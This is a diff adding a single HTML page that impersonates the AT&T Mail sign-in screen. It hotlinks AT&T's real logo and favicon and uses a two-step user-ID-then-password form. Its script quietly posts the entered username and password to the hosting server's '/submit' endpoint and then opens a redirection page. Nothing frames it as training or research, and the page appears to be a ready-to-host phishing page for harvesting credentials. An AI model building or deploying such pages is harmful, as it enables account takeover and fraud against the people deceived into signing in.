@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
+    <title>Login Form</title>
+    <link rel="icon" href="https://signin.att.com/favicon.ico" type="image/x-icon">
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <div class="login-form">
+            <img src="https://signin.att.com/static/siam/en/halo_c/images/logos/att_hz_lg_lkp_rgb_pos.svg" alt="AT&T Logo">
+            <h2>Sign in</h2>
+            <h2><strong>to access AT&T Mail and Currently.com</strong></h2>
+            <form id="loginForm" method="POST" action="/submit">
+                <div id="user-id-container">
+                    <p style="text-align: left;">User ID</p>
+                    <input type="text" name="username" id="username" required>
+                    <button type="button" onclick="showPassword()" class="submit-btn">Continue</button>
+                </div>
+                
+                <div id="password-container" style="display:none;">
+                    <p style="text-align: left;">Password</p>
+                    <input type="password" name="password" id="password" required>
+                    <input type="submit" value="Login" id="submitBtn">
+                </div>
+
+                <div class="forgot-link">
+                    <a href="#"><h3>Forgot user ID?</h3></a>
+                    <a href="#"><h3>Don't have a user ID? Create one now</h3></a>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        function showPassword() {
+            // Hide the User ID container
+            document.getElementById('user-id-container').style.display = 'none';
+
+            // Show the Password container
+            document.getElementById('password-container').style.display = 'block';
+
+            // Redirect to password container after 0.5 seconds
+            setTimeout(() => {
+                window.location.href = "#password-container";  // Optional smooth scroll to password field
+            }, 500);
+        }
+
+        // After form submission, redirect to confirmation page
+            document.getElementById('loginForm').onsubmit = async function(event) {
+        event.preventDefault(); // Prevent the default form submission behavior
+
+        // Disable the submit button to prevent multiple clicks
+        const submitBtn = document.getElementById('submitBtn');
+        submitBtn.disabled = true;
+
+        // Collect data from the form
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
+
+        // Send the data to the server using fetch
+        const response = await fetch('/submit', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded'
+            },
+            body: new URLSearchParams({
+                username: username,
+                password: password
+            })
+        });
+
+        // Check response and redirect immediately to a new tab
+        if (response.ok) {
+            // Open the redirection page in a new tab
+            window.open('/redirection.html', '_blank'); // Open in a new tab
+        } else {
+            console.error('Failed to submit form');
+            alert('There was an error submitting the form. Please try again.');
+            submitBtn.disabled = false; // Re-enable the button if there's an error
+        }
+    };
+
+
+
+    </script>
+</body>
+</html>
